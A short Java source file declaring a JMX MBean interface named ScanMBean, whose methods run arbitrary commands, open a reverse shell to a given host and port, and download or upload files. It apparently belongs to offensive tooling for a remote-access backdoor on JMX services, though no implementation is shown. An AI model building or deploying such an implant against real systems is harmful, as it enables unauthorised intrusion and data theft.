package fr.jrjgjk;

public interface ScanMBean {
	public String startCmd(String cmd);
	public String doRevShell(String host, int port);
	public byte[] downloadFile(String path) throws java.io.FileNotFoundException, java.io.IOException;
	public boolean uploadFile(byte[] fileContent, String destination) throws java.io.IOException;
}
